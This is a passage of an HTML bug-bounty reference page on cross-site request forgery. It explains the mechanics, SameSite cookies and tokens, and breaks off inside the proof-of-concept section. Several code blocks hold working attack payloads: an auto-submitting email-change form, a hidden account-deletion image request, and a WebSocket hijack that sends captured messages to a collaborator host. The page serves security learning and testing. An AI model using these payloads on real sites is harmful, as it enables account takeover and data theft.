@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSRF — Bug Bounty Reference | l1nuxkid</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:       #0a0c10;
+    --bg2:      #0f1117;
+    --bg3:      #151820;
+    --border:   #1e2330;
+    --border2:  #252b3b;
+    --text:     #c9d1e0;
+    --muted:    #4a5568;
+    --accent:   #e8c547;
+    --accent2:  #f07178;
+    --accent3:  #4fc3f7;
+    --accent4:  #a8ff78;
+    --purple:   #c792ea;
+    --sidebar-w: 270px;
+    --font-mono: 'JetBrains Mono', monospace;
+    --font-ui:   'Syne', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 14px;
+    line-height: 1.8;
+    display: flex;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─── SIDEBAR ─────────────────────────────────── */
+  #sidebar {
+    width: var(--sidebar-w);
+    min-height: 100vh;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    position: fixed;
+    top: 0; left: 0;
+    overflow-y: auto;
+    z-index: 100;
+    display: flex;
+    flex-direction: column;
+    padding-bottom: 40px;
+  }
+
+  .sidebar-header {
+    padding: 28px 22px 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .sidebar-badge {
+    display: inline-block;
+    background: var(--accent);
+    color: #000;
+    font-family: var(--font-ui);
+    font-size: 10px;
+    font-weight: 800;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    padding: 3px 8px;
+    border-radius: 3px;
+    margin-bottom: 10px;
+  }
+
+  .sidebar-title {
+    font-family: var(--font-ui);
+    font-size: 17px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.3;
+  }
+
+  .sidebar-title span { color: var(--accent); }
+
+  .sidebar-meta {
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+  }
+
+  .sidebar-section-label {
+    font-family: var(--font-ui);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--muted);
+    padding: 18px 22px 6px;
+  }
+
+  .sidebar-nav a {
+    display: block;
+    padding: 6px 22px 6px 22px;
+    color: #6b7a99;
+    text-decoration: none;
+    font-size: 12.5px;
+    font-family: var(--font-mono);
+    border-left: 2px solid transparent;
+    transition: all 0.15s;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .sidebar-nav a:hover,
+  .sidebar-nav a.active {
+    color: var(--accent);
+    border-left-color: var(--accent);
+    background: rgba(232, 197, 71, 0.06);
+  }
+
+  .sidebar-nav a.sub {
+    padding-left: 34px;
+    font-size: 11.5px;
+    color: #4a5568;
+  }
+  .sidebar-nav a.sub:hover { color: var(--accent3); border-left-color: var(--accent3); }
+
+  /* ─── MAIN ────────────────────────────────────── */
+  #main {
+    margin-left: var(--sidebar-w);
+    flex: 1;
+    max-width: 900px;
+    padding: 52px 52px 100px;
+  }
+
+  /* ─── HERO ────────────────────────────────────── */
+  .hero {
+    border: 1px solid var(--border2);
+    border-radius: 8px;
+    background: var(--bg3);
+    padding: 36px 40px;
+    margin-bottom: 52px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3));
+  }
+
+  .hero-eyebrow {
+    font-family: var(--font-ui);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 12px;
+  }
+
+  .hero h1 {
+    font-family: var(--font-ui);
+    font-size: 32px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.2;
+    margin-bottom: 16px;
+  }
+
+  .hero h1 span { color: var(--accent); }
+
+  .hero-summary {
+    background: rgba(232, 197, 71, 0.07);
+    border: 1px solid rgba(232, 197, 71, 0.2);
+    border-radius: 6px;
+    padding: 14px 18px;
+    font-size: 13px;
+    color: #c9d1e0;
+    margin-top: 20px;
+    line-height: 1.7;
+  }
+
+  .hero-summary strong { color: var(--accent); }
+
+  .hero-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 20px;
+  }
+
+  .tag {
+    background: var(--bg);
+    border: 1px solid var(--border2);
+    border-radius: 4px;
+    padding: 4px 10px;
+    font-size: 11px;
+    color: var(--muted);
+    font-family: var(--font-mono);
+  }
+
+  /* ─── SECTIONS ────────────────────────────────── */
+  section {
+    margin-bottom: 60px;
+    scroll-margin-top: 24px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 24px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-number {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--muted);
+    min-width: 28px;
+  }
+
+  .section-header h2 {
+    font-family: var(--font-ui);
+    font-size: 20px;
+    font-weight: 700;
+    color: #fff;
+  }
+
+  h3 {
+    font-family: var(--font-ui);
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--accent3);
+    margin: 28px 0 12px;
+    padding-left: 12px;
+    border-left: 2px solid var(--accent3);
+  }
+
+  h4 {
+    font-family: var(--font-ui);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--purple);
+    margin: 20px 0 8px;
+  }
+
+  p {
+    margin-bottom: 14px;
+    color: var(--text);
+    font-size: 13.5px;
+  }
+
+  strong { color: #e2e8f0; font-weight: 600; }
+
+  a { color: var(--accent3); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* ─── CALLOUTS ────────────────────────────────── */
+  .callout {
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 16px 0;
+    font-size: 13px;
+    line-height: 1.7;
+    border-left: 3px solid;
+  }
+
+  .callout.info {
+    background: rgba(79, 195, 247, 0.07);
+    border-color: var(--accent3);
+    color: #b0c4d8;
+  }
+
+  .callout.warning {
+    background: rgba(232, 197, 71, 0.07);
+    border-color: var(--accent);
+    color: #c9b86a;
+  }
+
+  .callout.danger {
+    background: rgba(240, 113, 120, 0.07);
+    border-color: var(--accent2);
+    color: #d4959a;
+  }
+
+  .callout strong { color: inherit; font-weight: 700; }
+
+  /* ─── CODE ────────────────────────────────────── */
+  .code-block {
+    position: relative;
+    margin: 16px 0;
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid var(--border2);
+  }
+
+  .code-header {
+    background: #0d1018;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: var(--font-ui);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .copy-btn {
+    background: none;
+    border: 1px solid var(--border2);
+    color: var(--muted);
+    font-family: var(--font-ui);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    padding: 3px 10px;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .copy-btn.copied { border-color: var(--accent4); color: var(--accent4); }
+
+  pre {
+    background: #0d1018;
+    padding: 18px 20px;
+    overflow-x: auto;
+    font-size: 12.5px;
+    line-height: 1.7;
+    tab-size: 2;
+  }
+
+  code { font-family: var(--font-mono); }
+
+  p code, li code {
+    background: rgba(255,255,255,0.06);
+    border: 1px solid var(--border2);
+    border-radius: 3px;
+    padding: 1px 6px;
+    font-size: 12px;
+    color: var(--accent2);
+  }
+
+  /* Syntax colours */
+  .kw  { color: #c792ea; }
+  .str { color: #a8ff78; }
+  .com { color: #4a5568; font-style: italic; }
+  .tag-c { color: var(--accent2); }
+  .attr { color: var(--accent3); }
+  .val { color: var(--accent4); }
+  .fn  { color: var(--accent); }
+
+  /* ─── TABLES ──────────────────────────────────── */
+  .table-wrap { overflow-x: auto; margin: 16px 0; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12.5px;
+  }
+
+  thead tr {
+    background: var(--bg3);
+    border-bottom: 2px solid var(--border2);
+  }
+
+  th {
+    font-family: var(--font-ui);
+    font-weight: 700;
+    font-size: 11px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--muted);
+    padding: 10px 16px;
+    text-align: left;
+  }
+
+  td {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+    color: var(--text);
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,0.02); }
+
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 3px;
+    font-size: 11px;
+    font-weight: 700;
+    font-family: var(--font-ui);
+  }
+  .badge-green  { background: rgba(168,255,120,0.12); color: var(--accent4); }
+  .badge-red    { background: rgba(240,113,120,0.12); color: var(--accent2); }
+  .badge-yellow { background: rgba(232,197,71,0.12);  color: var(--accent); }
+  .badge-blue   { background: rgba(79,195,247,0.12);  color: var(--accent3); }
+
+  /* ─── BYPASS CARDS ────────────────────────────── */
+  .bypass-card {
+    border: 1px solid var(--border2);
+    border-radius: 8px;
+    background: var(--bg2);
+    margin-bottom: 28px;
+    overflow: hidden;
+  }
+
+  .bypass-card-header {
+    background: var(--bg3);
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .bypass-num {
+    background: var(--accent);
+    color: #000;
+    font-family: var(--font-ui);
+    font-weight: 800;
+    font-size: 12px;
+    width: 24px; height: 24px;
+    border-radius: 4px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .bypass-card-title {
+    font-family: var(--font-ui);
+    font-weight: 700;
+    font-size: 14px;
+    color: #fff;
+  }
+
+  .bypass-card-body { padding: 18px 20px; }
+
+  /* ─── CHECKLIST ───────────────────────────────── */
+  .checklist {
+    list-style: none;
+    display: grid;
+    gap: 8px;
+  }
+
+  .checklist li {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 14px 10px 42px;
+    position: relative;
+    font-size: 12.5px;
+    color: var(--text);
+    transition: border-color 0.15s;
+  }
+
+  .checklist li:hover { border-color: var(--accent); }
+
+  .checklist li::before {
+    content: '[ ]';
+    position: absolute;
+    left: 14px;
+    color: var(--muted);
+    font-family: var(--font-mono);
+    font-size: 11px;
+  }
+
+  .checklist li.high::before { content: '[!]'; color: var(--accent2); }
+  .checklist li.med::before  { content: '[~]'; color: var(--accent); }
+
+  /* ─── STEPS ───────────────────────────────────── */
+  .steps { display: grid; gap: 12px; margin: 16px 0; }
+
+  .step {
+    display: flex;
+    gap: 16px;
+    align-items: flex-start;
+  }
+
+  .step-num {
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #000;
+    font-family: var(--font-ui);
+    font-weight: 800;
+    font-size: 12px;
+    width: 26px; height: 26px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .step-body { flex: 1; }
+  .step-body p { margin: 0; font-size: 13px; }
+
+  /* ─── LISTS ───────────────────────────────────── */
+  ul, ol {
+    padding-left: 24px;
+    margin: 10px 0 14px;
+    color: var(--text);
+    font-size: 13.5px;
+  }
+
+  li { margin-bottom: 6px; line-height: 1.7; }
+
+  ul li::marker { color: var(--accent); }
+  ol li::marker { color: var(--muted); font-family: var(--font-mono); }
+
+  /* ─── DIVIDER ─────────────────────────────────── */
+  hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 40px 0;
+  }
+
+  /* ─── FOOTER ──────────────────────────────────── */
+  .footer {
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    font-size: 12px;
+    color: var(--muted);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+
+  .footer-left { display: flex; flex-direction: column; gap: 4px; }
+  .footer .accent { color: var(--accent); }
+
+  /* ─── SCROLLBAR ───────────────────────────────── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  /* ─── RESPONSIVE ──────────────────────────────── */
+  @media (max-width: 860px) {
+    #sidebar { display: none; }
+    #main { margin-left: 0; padding: 28px 20px 80px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════ SIDEBAR ═════════════════════════════════ -->
+<nav id="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-badge">Bug Bounty Ref</div>
+    <div class="sidebar-title"><span>CSRF</span> Complete Notes</div>
+    <div class="sidebar-meta">by l1nuxkid · PortSwigger + HTB</div>
+  </div>
+
+  <div class="sidebar-section-label">Foundations</div>
+  <div class="sidebar-nav">
+    <a href="#what-is-csrf">What is CSRF?</a>
+    <a href="#how-csrf-works">How CSRF Works</a>
+    <a href="#conditions">Key Conditions</a>
+    <a href="#csrf-vs-xss">CSRF vs XSS</a>
+  </div>
+
+  <div class="sidebar-section-label">Prerequisites</div>
+  <div class="sidebar-nav">
+    <a href="#sop">Same-Origin Policy</a>
+    <a href="#site-vs-origin">Site vs Origin</a>
+    <a href="#samesite-cookies">SameSite Cookies</a>
+    <a href="#referer-header">Referer Header</a>
+    <a href="#csrf-tokens">CSRF Tokens</a>
+  </div>
+
+  <div class="sidebar-section-label">Attack Surface</div>
+  <div class="sidebar-nav">
+    <a href="#types">Types of CSRF</a>
+    <a href="#finding">Finding CSRF</a>
+    <a href="#construct">Constructing a PoC</a>
+  </div>
+
+  <div class="sidebar-section-label">Bypass Techniques</div>
+  <div class="sidebar-nav">
+    <a href="#token-bypass">Token Validation Bypasses</a>
+    <a href="#token-bp-1" class="sub">1. POST → GET</a>
+    <a href="#token-bp-2" class="sub">2. Remove token</a>
+    <a href="#token-bp-3" class="sub">3. Not tied to session</a>
+    <a href="#token-bp-4" class="sub">4. Non-session cookie</a>
+    <a href="#token-bp-5" class="sub">5. Double submit</a>
+    <a href="#token-bp-6" class="sub">6. Weak/predictable</a>
+    <a href="#samesite-bypass">SameSite Bypasses</a>
+    <a href="#ss-lax-get" class="sub">Lax → GET</a>
+    <a href="#ss-lax-method" class="sub">Lax → Method Override</a>
+    <a href="#ss-lax-refresh" class="sub">Lax → Cookie Refresh</a>
+    <a href="#ss-strict-redirect" class="sub">Strict → Redirect</a>
+    <a href="#ss-strict-sibling" class="sub">Strict → Sibling Domain</a>
+    <a href="#referer-bypass">Referer Bypasses</a>
+  </div>
+
+  <div class="sidebar-section-label">Reference</div>
+  <div class="sidebar-nav">
+    <a href="#impact">Impact</a>
+    <a href="#mitigations">Mitigations</a>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#h1reports">H1 Reports</a>
+    <a href="#references">References</a>
+  </div>
+</nav>
+
+<!-- ═══════════════════════════════ MAIN ════════════════════════════════════ -->
+<main id="main">
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-eyebrow">Web Security · Attack Reference</div>
+    <h1>Cross-Site Request<br><span>Forgery (CSRF)</span></h1>
+    <div class="hero-summary">
+      <strong>One-liner:</strong> CSRF is a <strong>one-way</strong> attack — the attacker can force the victim's browser to send a request, but cannot read the response. It targets <strong>state-changing actions</strong> (email change, password reset, fund transfer), not data theft. The victim must be authenticated.
+    </div>
+    <div class="hero-tags">
+      <span class="tag">Web Security</span>
+      <span class="tag">Session Abuse</span>
+      <span class="tag">SameSite</span>
+      <span class="tag">CSRF Tokens</span>
+      <span class="tag">PortSwigger</span>
+      <span class="tag">Bug Bounty</span>
+    </div>
+  </div>
+
+  <!-- ───── WHAT IS CSRF ───────────────────────────────────── -->
+  <section id="what-is-csrf">
+    <div class="section-header">
+      <span class="section-number">01</span>
+      <h2>What is CSRF?</h2>
+    </div>
+    <p>Cross-Site Request Forgery (CSRF) is a web vulnerability where an attacker tricks a victim's browser into sending an authenticated request to a web application — without the victim's knowledge or intent.</p>
+    <p>Modern web applications identify users through session cookies. The browser automatically attaches these cookies to every request sent to the corresponding domain. CSRF abuses this behaviour: by tricking the victim into triggering a request (via a malicious link, image, or form), the attacker causes the victim's browser to send a request that includes their valid session cookie, making the server believe it was an intentional user action.</p>
+    <div class="callout warning">
+      <strong>Important:</strong> CSRF does not allow the attacker to steal data or read responses. It only forces the victim's browser to perform state-changing actions on their behalf.
+    </div>
+  </section>
+
+  <!-- ───── HOW IT WORKS ───────────────────────────────────── -->
+  <section id="how-csrf-works">
+    <div class="section-header">
+      <span class="section-number">02</span>
+      <h2>How CSRF Works</h2>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body"><p>The victim logs into a legitimate web application. Their browser stores a session cookie.</p></div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body"><p>The attacker tricks the victim into visiting a malicious page containing a crafted request (hidden form, image tag, or JavaScript).</p></div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body"><p>The victim's browser automatically sends the request to the target application, including the valid session cookie. The server processes it as a legitimate user action.</p></div>
+      </div>
+    </div>
+    <div class="callout info">
+      <strong>Why browsers do this:</strong> Browsers are designed to automatically include cookies with requests to matching domains — this is expected behaviour. The vulnerability exists because the web application trusts any request containing a valid session cookie, regardless of where it originated.
+    </div>
+  </section>
+
+  <!-- ───── KEY CONDITIONS ─────────────────────────────────── -->
+  <section id="conditions">
+    <div class="section-header">
+      <span class="section-number">03</span>
+      <h2>Key Conditions for CSRF</h2>
+    </div>
+    <p>All three must be true for a CSRF attack to succeed:</p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Condition</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Authenticated session</strong></td><td>The victim must be logged in — the browser holds a valid session cookie</td></tr>
+          <tr><td><strong>State-changing action</strong></td><td>The target request must modify data (not just read it)</td></tr>
+          <tr><td><strong>No origin verification</strong></td><td>The application doesn't verify the request originated from a trusted source</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ───── CSRF vs XSS ────────────────────────────────────── -->
+  <section id="csrf-vs-xss">
+    <div class="section-header">
+      <span class="section-number">04</span>
+      <h2>CSRF vs XSS — Key Difference</h2>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th></th><th>CSRF</th><th>XSS</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Direction</strong></td><td>One-way — can't read response</td><td>Two-way — reads response, exfiltrates data</td></tr>
+          <tr><td><strong>What it abuses</strong></td><td>Trust the server has in the browser</td><td>Trust the user has in the website</td></tr>
+          <tr><td><strong>Requires JS?</strong></td><td>No — plain HTML form is enough</td><td>Yes</td></tr>
+          <tr><td><strong>Can steal data?</strong></td><td><span class="badge badge-red">No</span></td><td><span class="badge badge-green">Yes</span></td></tr>
+          <tr><td><strong>Session needed?</strong></td><td>Yes — victim must be authed</td><td>Not always</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout warning">
+      <strong>Chain them:</strong> If you have XSS on the same origin, you can read CSRF tokens and bypass CSRF protection entirely — the ultimate combo.
+    </div>
+  </section>
+
+  <!-- ───── PREREQUISITES ──────────────────────────────────── -->
+  <section id="sop">
+    <div class="section-header">
+      <span class="section-number">05</span>
+      <h2>Same-Origin Policy (SOP)</h2>
+    </div>
+    <p>SOP is a browser security mechanism that prevents a script on one origin from accessing resources on a different origin. An <strong>origin</strong> = Protocol + Hostname + Port. All three must match.</p>
+    <div class="callout danger">
+      <strong>Why SOP doesn't stop CSRF:</strong> SOP controls whether a script can <em>read</em> a cross-origin response. It does NOT prevent a browser from <em>sending</em> cross-origin requests. A form submission from a malicious page still sends the cookies — the browser just won't give the attacker access to the response.
+    </div>
+  </section>
+
+  <section id="site-vs-origin">
+    <div class="section-header">
+      <span class="section-number">06</span>
+      <h2>Site vs Origin</h2>
+    </div>
+    <p>These are often confused — understanding the difference is critical for SameSite cookie bypasses.</p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>From</th><th>To</th><th>Same-site?</th><th>Same-origin?</th></tr></thead>
+        <tbody>
+          <tr><td><code>https://example.com</code></td><td><code>https://example.com</code></td><td><span class="badge badge-green">Yes</span></td><td><span class="badge badge-green">Yes</span></td></tr>
+          <tr><td><code>https://app.example.com</code></td><td><code>https://intranet.example.com</code></td><td><span class="badge badge-green">Yes</span></td><td><span class="badge badge-red">No — subdomain</span></td></tr>
+          <tr><td><code>https://example.com</code></td><td><code>https://example.com:8080</code></td><td><span class="badge badge-green">Yes</span></td><td><span class="badge badge-red">No — port</span></td></tr>
+          <tr><td><code>https://example.com</code></td><td><code>https://example.co.uk</code></td><td><span class="badge badge-red">No — eTLD</span></td><td><span class="badge badge-red">No</span></td></tr>
+          <tr><td><code>https://example.com</code></td><td><code>http://example.com</code></td><td><span class="badge badge-red">No — scheme</span></td><td><span class="badge badge-red">No</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout info">
+      <strong>Key implication:</strong> <code>cms.example.com</code> is the <em>same site</em> as <code>example.com</code>. XSS on a sibling domain = same-site requests = SameSite=Strict bypass.
+    </div>
+  </section>
+
+  <section id="samesite-cookies">
+    <div class="section-header">
+      <span class="section-number">07</span>
+      <h2>SameSite Cookies</h2>
+    </div>
+    <p>The <code>SameSite</code> attribute tells the browser when to include a cookie in cross-site requests. It's the primary modern defence against CSRF.</p>
+
+    <h3>Strict</h3>
+    <p>Cookie is sent <strong>only</strong> if the request originates from the exact same site. No cross-site requests — not even top-level navigations (clicking a link from email). Strongest protection.</p>
+
+    <h3>Lax</h3>
+    <p>Cookie is sent in cross-site requests only if: the request is a <strong>top-level navigation</strong> AND the method is <strong>safe</strong> (GET/HEAD/OPTIONS). POST requests from external sites are blocked. Chrome's default since 2021 when no attribute is specified.</p>
+
+    <h3>None</h3>
+    <p>Cookie is sent with <strong>all</strong> cross-site requests. Requires the <code>Secure</code> flag. No CSRF protection — only use for legitimate cross-site flows (OAuth, iframes).</p>
+
+    <h3>Chrome's 2-Minute Rule</h3>
+    <div class="callout warning">
+      When a cookie is set <strong>without any SameSite attribute</strong>, Chrome treats it as Lax — but for the <strong>first 2 minutes</strong>, POST requests are also allowed (just like None). After 2 minutes, it reverts to strict Lax. This creates a bypass window if you can force a session cookie refresh via OAuth.
+    </div>
+  </section>
+
+  <section id="referer-header">
+    <div class="section-header">
+      <span class="section-number">08</span>
+      <h2>The Referer Header</h2>
+    </div>
+    <p>The <code>Referer</code> header is optional and tells the server the URL of the page that triggered the request. Some apps use it as a CSRF defence — checking the referer comes from their own domain. This is weaker than tokens and frequently bypassable.</p>
+  </section>
+
+  <section id="csrf-tokens">
+    <div class="section-header">
+      <span class="section-number">09</span>
+      <h2>CSRF Tokens</h2>
+    </div>
+    <p>A CSRF token is a unique, secret, unpredictable value generated server-side and tied to the user's session. The server rejects requests where the token is missing or wrong.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — hidden form field</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"/my-account/change-email"</span> <span class="attr">method</span>=<span class="str">"POST"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"email"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"user@example.com"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"csrf"</span> <span class="attr">value</span>=<span class="str">"50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;button</span> <span class="attr">type</span>=<span class="str">"submit"</span><span class="tag-c">&gt;</span>Update email<span class="tag-c">&lt;/button&gt;</span>
+<span class="tag-c">&lt;/form&gt;</span></code></pre>
+    </div>
+  </section>
+
+  <!-- ───── TYPES ───────────────────────────────────────────── -->
+  <section id="types">
+    <div class="section-header">
+      <span class="section-number">10</span>
+      <h2>Types of CSRF</h2>
+    </div>
+
+    <h3>Traditional CSRF (Form-Based)</h3>
+    <p>Most common. Hidden HTML form auto-submits when the page loads.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/update_email"</span> <span class="attr">method</span>=<span class="str">"POST"</span> <span class="attr">id</span>=<span class="str">"csrf"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span><span class="tag-c">&gt;</span>
+<span class="tag-c">&lt;/form&gt;</span>
+<span class="tag-c">&lt;script&gt;</span><span class="fn">document.getElementById</span>(<span class="str">"csrf"</span>).<span class="fn">submit</span>();<span class="tag-c">&lt;/script&gt;</span></code></pre>
+    </div>
+
+    <h3>GET-Based CSRF</h3>
+    <p>If a state-changing action accepts GET, an image tag is enough — no form, no JS:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;img</span> <span class="attr">src</span>=<span class="str">"https://TARGET.com/delete_account?confirm=yes"</span> <span class="attr">width</span>=<span class="str">"0"</span> <span class="attr">height</span>=<span class="str">"0"</span><span class="tag-c">&gt;</span></code></pre>
+    </div>
+
+    <h3>XMLHttpRequest / Fetch-Based CSRF</h3>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="fn">fetch</span>(<span class="str">'https://TARGET.com/api/updateEmail'</span>, {
+    <span class="attr">method</span>: <span class="str">'POST'</span>,
+    <span class="attr">body</span>: <span class="fn">JSON.stringify</span>({ <span class="attr">email</span>: <span class="str">'attacker@evil.com'</span> }),
+    <span class="attr">credentials</span>: <span class="str">'include'</span>
+});</code></pre>
+    </div>
+
+    <h3>Cross-Site WebSocket Hijacking (CSWSH)</h3>
+    <p>WebSocket endpoint relies only on session cookies, no origin check. Attacker opens a WS connection as the victim:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="kw">var</span> ws = <span class="kw">new</span> <span class="fn">WebSocket</span>(<span class="str">'wss://TARGET.com/chat'</span>);
+ws.<span class="fn">onopen</span> = <span class="kw">function</span>() { ws.<span class="fn">send</span>(<span class="str">"READY"</span>); };
+ws.<span class="fn">onmessage</span> = <span class="kw">function</span>(event) {
+    <span class="fn">fetch</span>(<span class="str">'https://COLLABORATOR.oastify.com'</span>, {
+        <span class="attr">method</span>: <span class="str">'POST'</span>,
+        <span class="attr">mode</span>: <span class="str">'no-cors'</span>,
+        <span class="attr">body</span>: event.data
+    });
+};</code></pre>
+    </div>
+  </section>
+
+  <!-- ───── FINDING ────────────────────────────────────────── -->
+  <section id="finding">
+    <div class="section-header">
+      <span class="section-number">11</span>
+      <h2>Finding CSRF — What to Look For</h2>
+    </div>
+    <p>CSRF targets <strong>state-changing requests</strong>. Flag every request that:</p>
+    <ul>
+      <li>Changes email address or password</li>
+      <li>Updates account settings or profile</li>
+      <li>Deletes data or accounts</li>
+      <li>Performs financial transactions</li>
+      <li>Changes roles or permissions</li>
+      <li>Logs the user out</li>
+    </ul>
+    <p>For each, ask: <strong>Can this action be triggered without verifying the request came from the user?</strong></p>
+    <div class="callout danger">
+      <strong>Myth:</strong> POST requests are NOT automatically CSRF-safe. Any HTTP method can be abused if origin isn't verified.
+    </div>
+  </section>
+
+  <!-- ───── CONSTRUCT ──────────────────────────────────────── -->
+  <section id="construct">
+    <div class="section-header">
+      <span class="section-number">12</span>
+      <h2>Constructing a CSRF PoC</h2>
+    </div>
+
+    <h3>Using Burp Suite Pro</h3>
+    <div class="steps">
+      <div class="step"><div class="step-num">1</div><div class="step-body"><p>Intercept the target request in Burp Suite.</p></div></div>
+      <div class="step"><div class="step-num">2</div><div class="step-body"><p>Right-click → <strong>Engagement Tools → Generate CSRF PoC</strong>. Enable "Auto-submit script".</p></div></div>
+      <div class="step"><div class="step-num">3</div><div class="step-body"><p>Host the HTML on your server or Exploit Server. Deliver URL to victim.</p></div></div>
+    </div>
+
+    <h3>POST-Based PoC</h3>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — post poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;html&gt;&lt;body&gt;</span>
